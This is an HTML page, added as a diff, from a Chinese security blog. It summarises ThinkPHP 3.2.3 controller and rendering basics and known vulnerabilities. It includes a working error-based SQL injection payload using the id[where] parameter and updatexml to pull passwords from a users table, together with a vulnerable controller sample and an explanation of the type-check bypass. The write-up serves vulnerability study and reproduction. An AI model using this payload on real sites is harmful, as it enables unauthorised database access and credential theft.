@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+
+<html lang="zh-CN">
+
+
+<head>
+  <meta charset="utf-8" />
+    
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <title>
+    Thinkphp3漏洞总结 |  Wh1tecell&#39;blog
+  </title>
+  <meta name="generator" content="hexo-theme-ayer">
+  
+  <link rel="shortcut icon" href="/favicon.ico" />
+  
+  
+<link rel="stylesheet" href="/dist/main.css">
+
+  
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css">
+
+  
+<link rel="stylesheet" href="/css/custom.css">
+
+  
+  
+<script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+
+  
+  
+
+  
+
+</head>
+
+</html>
+
+<body>
+  <div id="app">
+    
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-Thinkphp3漏洞总结"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  Thinkphp3漏洞总结
+</h1>
+ 
+
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/10/28/Thinkphp3%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" class="article-date">
+  <time datetime="2021-10-28T12:30:51.000Z" itemprop="datePublished">2021-10-28</time>
+</a>   
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> 字数统计:</span>
+            <span class="post-count">859</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> 阅读时长≈</span>
+            <span class="post-count">3 分钟</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h2 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h2><p>mbp+vscode+mamp pro</p>
+<p>参 <a target="_blank" rel="noopener" href="https://www.cnblogs.com/phonecom/p/10340038.html">https://www.cnblogs.com/phonecom/p/10340038.html</a></p>
+<h2 id="TP3-2-3官方手册"><a href="#TP3-2-3官方手册" class="headerlink" title="TP3.2.3官方手册"></a>TP3.2.3官方手册</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp/1678">Thinkphp3 开发手册</a></li>
+<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2630">Thinkphp3.2.3 安全开发须知</a></li>
+</ul>
+<h3 id="控制器"><a href="#控制器" class="headerlink" title="控制器"></a>控制器</h3><p>控制器类的命名方式是：<strong>控制器名（驼峰法，首字母大写）+Controller</strong></p>
+<p>控制器文件的命名方式是：<strong>类名+class.php（类文件后缀）</strong></p>
+<p>默认的欢迎页面其实就是访问的Home模块下面的Index控制器类的index操作方法 我们修改默认的index操作方法如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;hello,world!&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>访问</p>
+<p>/home/index/index 就可以可看到 hello world</p>
+<p>也可以访问</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?m=Home&amp;c=Index&amp;a=index</span><br><span class="line"></span><br><span class="line">?s=home/index/index</span><br><span class="line">都相当于访问   /home/index/index</span><br></pre></td></tr></table></figure>
+
+<h2 id="常用的方法-I-M-等等方法"><a href="#常用的方法-I-M-等等方法" class="headerlink" title="常用的方法  I  M 等等方法"></a>常用的方法  I  M 等等方法</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/kenshinobiy/p/9165662.html">ThinkPHP中的常用方法汇总总结:M方法，D方法，U方法，I方法</a>等等</p>
+<p><a target="_blank" rel="noopener" href="https://www.kancloud.cn/manual/thinkphp/1721">https://www.kancloud.cn/manual/thinkphp/1721</a></p>
+<h2 id="渲染"><a href="#渲染" class="headerlink" title="渲染"></a>渲染</h2><p>也就是用 assign 和 display组合起来达到渲染的效果 (当然还有其它方法可以)</p>
+<h3 id="display"><a href="#display" class="headerlink" title="display()"></a>display()</h3><p>this-&gt;display();后面没参数的话，提交到当前模块儿的当前方法.html（tpl下面的文件夹名字即是模块名，它下面的某个.html文件也就是提交到的方法.html）文件中展示。</p>
+<p>this-&gt;display();里面传路径，也就是要展示的.html所在的路径。</p>
+<h3 id="assign"><a href="#assign" class="headerlink" title="assign()"></a>assign()</h3><p><code>this-&gt;assign($1,$2)</code>;$2即为传过来的参数（自己在本方法中定义的），$1为展示页面中需要的参数(即：display到的页面中传的参数)</p>
+<p>控制器里这样写</p>
+<p><img src="https://img-blog.csdnimg.cn/323b318dc5784779aa11b56ecceaf245.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/323b318dc5784779aa11b56ecceaf245.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>渲染页面这样写</p>
+<p><img src="https://img-blog.csdnimg.cn/970e805254ad4b6795a3cf7e09d46ec1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/970e805254ad4b6795a3cf7e09d46ec1.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>展示出来的效果如下图</p>
+<p><img src="https://img-blog.csdnimg.cn/4910cc282a634c15a3dd6ee8f04e7066.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/4910cc282a634c15a3dd6ee8f04e7066.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<h2 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h2><p><code>/ThinkPHP/Conf/convention.php</code></p>
+<p><img src="https://img-blog.csdnimg.cn/bc27667e7c114caa87d6bf484991ae7c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/bc27667e7c114caa87d6bf484991ae7c.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<h2 id="ThinkPhp3-2-3缓存漏洞"><a href="#ThinkPhp3-2-3缓存漏洞" class="headerlink" title="ThinkPhp3.2.3缓存漏洞"></a>ThinkPhp3.2.3缓存漏洞</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u010433704/article/details/103069229">https://blog.csdn.net/u010433704/article/details/103069229</a></p>
+<p>需要S的缓存方法当前提 比较鸡肋</p>
+<h2 id="Thinkphp3-2-3-where注入"><a href="#Thinkphp3-2-3-where注入" class="headerlink" title="Thinkphp3.2.3 where注入"></a>Thinkphp3.2.3 where注入</h2><p>payload</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id[where]=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=updatexml(<span class="number">1</span>,concat(<span class="number">0x7e</span>,(select password <span class="keyword">from</span> users limit <span class="number">1</span>),<span class="number">0x7e</span>),<span class="number">1</span>)%<span class="number">23</span></span><br></pre></td></tr></table></figure>
+
+<p>条件代码如下就行 (使用get方式查询users表中id=? 的数据)</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">Home</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">       <span class="variable">$data</span> = M(<span class="string">&#x27;users&#x27;</span>)-&gt;find(I(<span class="string">&#x27;GET.id&#x27;</span>));</span><br><span class="line">       var_dump(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload截图</p>
+<p><img src="https://img-blog.csdnimg.cn/70f499046abc4673a977fe97c9935e9d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/70f499046abc4673a977fe97c9935e9d.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>首先正常输入 ?id=1’</p>
+<p>流程为 <code>id=1&#39;</code> -&gt; <code>I()</code> -&gt; <code>find()</code> -&gt; <code>_parseOptions()</code> -&gt; <code>_parseType()</code> 然后将我们的字符串清理了。 要知道id参数被改变的时间点在<code>_parseType()</code>中，那进入这个方法要满足</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; is_array(<span class="variable">$options</span>[<span class="string">&#x27;where&#x27;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$fields</span>) &amp;&amp; !<span class="keyword">isset</span>(<span class="variable">$options</span>[<span class="string">&#x27;join&#x27;</span>]))</span><br></pre></td></tr></table></figure>
+
+<p>_parseType 方法  会进行强制类型转换 所以我们需要绕过这个</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">_parseType</span>(<span class="params">&amp;<span class="variable">$data</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;options[<span class="string">&#x27;bind&#x27;</span>][<span class="string">&#x27;:&#x27;</span> . <span class="variable">$key</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;_type&#x27;</span>][<span class="variable">$key</span>])) &#123;</span><br><span class="line">        <span class="variable">$fieldType</span> = strtolower(<span class="keyword">$this</span>-&gt;fields[<span class="string">&#x27;_type&#x27;</span>][<span class="variable">$key</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="literal">false</span> !== strpos(<span class="variable">$fieldType</span>, <span class="string">&#x27;enum&#x27;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 支持ENUM类型优先检测</span></span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="literal">false</span> === strpos(<span class="variable">$fieldType</span>, <span class="string">&#x27;bigint&#x27;</span>) &amp;&amp; <span class="literal">false</span> !== strpos(<span class="variable">$fieldType</span>, <span class="string">&#x27;int&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$data</span>[<span class="variable">$key</span>] = intval(<span class="variable">$data</span>[<span class="variable">$key</span>]);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="literal">false</span> !== strpos(<span class="variable">$fieldType</span>, <span class="string">&#x27;float&#x27;</span>) || <span class="literal">false</span> !== strpos(<span class="variable">$fieldType</span>, <span class="string">&#x27;double&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$data</span>[<span class="variable">$key</span>] = floatval(<span class="variable">$data</span>[<span class="variable">$key</span>]);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (<span class="literal">false</span> !== strpos(<span class="variable">$fieldType</span>, <span class="string">&#x27;bool&#x27;</span>)) &#123;</span><br><span class="line">            <span class="variable">$data</span>[<span class="variable">$key</span>] = (<span class="keyword">bool</span>) <span class="variable">$data</span>[<span class="variable">$key</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>下面这张是正常的传参</p>
+<p><img src="https://img-blog.csdnimg.cn/6d3d3e77307442738617f18f2f18a948.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/6d3d3e77307442738617f18f2f18a948.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>下面这个是传参 <code>?id[where]=3 and 1=1</code> 可以发现 options[where] 不是数组了 绕过<code>_parseType</code></p>
+<p><img src="https://img-blog.csdnimg.cn/8e24a65d75944b16b0f1426cf711d345.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="https://img-blog.csdnimg.cn/8e24a65d75944b16b0f1426cf711d345.png?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA5p6X5LiA5LiN5pivMDE=,size_20,color_FFFFFF,t_70,g_se,x_16"></p>
+<p>参  <a target="_blank" rel="noopener" href="https://darkless.cn/2020/06/07/thinkphp3.2.3-sqli/">https://darkless.cn/2020/06/07/thinkphp3.2.3-sqli/</a></p>
+<h2 id="Thinkphp-3-2-3-exp注入-和-Thinkphp-3-2-3-bind注入"><a href="#Thinkphp-3-2-3-exp注入-和-Thinkphp-3-2-3-bind注入" class="headerlink" title="Thinkphp 3.2.3 exp注入 和  Thinkphp 3.2.3 bind注入"></a>Thinkphp 3.2.3 exp注入 和  Thinkphp 3.2.3 bind注入</h2><p>参考 <a target="_blank" rel="noopener" href="https://y4er.com/post/thinkphp3-vuln/">https://y4er.com/post/thinkphp3-vuln/</a></p>
+<h2 id="ThinkPHP3-2-x-RCE漏洞"><a href="#ThinkPHP3-2-x-RCE漏洞" class="headerlink" title="ThinkPHP3.2.x RCE漏洞"></a>ThinkPHP3.2.x RCE漏洞</h2><p>要有可控参数可以assign</p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1855060">https://cloud.tencent.com/developer/article/1855060</a></p>
+<p><a target="_blank" rel="noopener" href="https://0xcreed.jxustctf.top/2021/07/ThinkPHP3-2-x-RCE%E5%A4%8D%E7%8E%B0/">https://0xcreed.jxustctf.top/2021/07/ThinkPHP3-2-x-RCE复现/</a></p>
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>版权声明： </strong>
+          
+          本博客所有文章除特别声明外，著作权归作者所有。转载请注明出处！
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://wh1tecell.top/2021/10/28/Thinkphp3%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/tp3/" rel="tag">tp3</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" rel="tag">漏洞复现</a></li></ul>
+
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+    
+      <a href="/2021/10/03/PHP-FPM%E5%AD%A6%E4%B9%A0/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">PHP-FPM学习</div>
+      </a>
+    
+  </nav>
+
+   
+<!-- valine评论 -->
+<div id="vcomments-box">
+  <div id="vcomments"></div>
+</div>
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+    el: "#vcomments",
+    app_id: "",
+    app_key: "",
+    path: window.location.pathname,
+    avatar: "monsterid",
+    placeholder: "给我的文章加点评论吧~",
+    recordIP: true,
+  });
+  const infoEle = document.querySelector("#vcomments .info");
+  if (infoEle && infoEle.childNodes && infoEle.childNodes.length > 0) {
+    infoEle.childNodes.forEach(function (item) {
+      item.parentNode.removeChild(item);
+    });
+  }
+</script>
+<style>
+  #vcomments-box {
+    padding: 5px 30px;
+  }
+
+  @media screen and (max-width: 800px) {
+    #vcomments-box {
+      padding: 5px 0px;
+    }
+  }
+
+  #vcomments-box #vcomments {
+    background-color: #fff;
+  }
+
+  .v .vlist .vcard .vh {
+    padding-right: 20px;
+  }
+
+  .v .vlist .vcard {
+    padding-left: 10px;
+  }
+</style>
+
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2021
+        <i class="ri-heart-fill heart_icon"></i> Wh1tecell
+      </li>
+    </ul>
+    <ul>
+      <li>
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>访问人数:<span id="busuanzi_value_site_uv"></span></s>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+        <li>
+          <a href="" target="_black" rel="nofollow">闽ICP备2021001239号</a>
+        </li>
+        
+    </ul>
+    <!-- 运行天数 -->
+	<ul>
+		<li><span id="runtime_span"></span></li>
+		<script type="text/javascript">			
+    function show_runtime() {
+        window.setTimeout("show_runtime()", 1000);
+        X = new Date("01/01/2021 12:00:00");
+        Y = new Date();
+        T = (Y.getTime() - X.getTime());
+        M = 24 * 60 * 60 * 1000;
+        a = T / M;
+        A = Math.floor(a);
+        b = (a - A) * 24;
+        B = Math.floor(b);
+        c = (b - B) * 60;
+        C = Math.floor((b - B) * 60);
+        D = Math.floor((c - C) * 60);
+        runtime_span.innerHTML = "小站在各种崩坏中坚持了:" + A + "天" + B + "小时" + C + "分" + D + "秒"
+    }
+	show_runtime();
+</script>
+
+	</ul>
+
+
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>
+
+
+      <div class="float_btns">
+        <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+      </div>
+    </main>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/touxiang.png" alt="Wh1tecell&#39;blog"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+      <a class="nav-item-link" target="_blank" href="/atom.xml" title="RSS Feed">
+        <i class="ri-rss-line"></i>
+      </a>
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <script>
+      if (window.matchMedia("(max-width: 768px)").matches) {
+        document.querySelector('.content').classList.remove('on');
+        document.querySelector('.sidebar').classList.remove('on');
+      }
+    </script>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+
+
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: '.tocbot',
+    contentSelector: '.article-entry',
+    headingSelector: 'h1, h2, h3, h4, h5, h6',
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: 'main',
+    positionFixedSelector: '.tocbot',
+    positionFixedClass: 'is-position-fixed',
+    fixedSidebarOffset: 'auto'
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css">
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script>
+
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+<!-- ClickLove -->
+
+
+<script src="/js/clickLove.js"></script>
+
+
+<!-- ClickBoom1 -->
+
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+
+
+<link rel="stylesheet" href="/css/clipboard.css">
+
+<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
